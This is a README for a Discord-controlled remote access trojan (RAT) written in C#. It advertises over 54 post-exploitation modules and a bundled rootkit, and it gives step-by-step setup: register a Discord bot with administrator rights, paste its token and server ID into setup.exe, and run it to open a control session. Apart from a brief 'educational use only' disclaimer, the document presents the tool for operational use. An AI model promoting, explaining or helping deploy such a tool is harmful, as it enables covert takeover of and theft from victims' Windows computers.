# DiscordRat-1.0

Discord Remote Administration Tool fully written in c#.

This is a RAT controlled over Discord with over 54 post exploitation modules.

The output file size also around ~75kb!

Disclaimer:
This tool is for educational use only, the author will not be held responsible for any misuse of this tool.

Credits
The rootkit in the project was made by "bytecode77". The source of the rootkit can be found here: https://github.com/bytecode77/r77-rootkit

# SetUp

You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server). Once the bot is created open "setup.exe" and paste the token in, and paste the guild ID of where you invited the bot

Then if the steps above were successful, you can launch the file by executing setup.exe. It will create a new channel and post a message on the server with a generated session number.
Now your bot should be available to use !

Requirements:
Windows(x64)
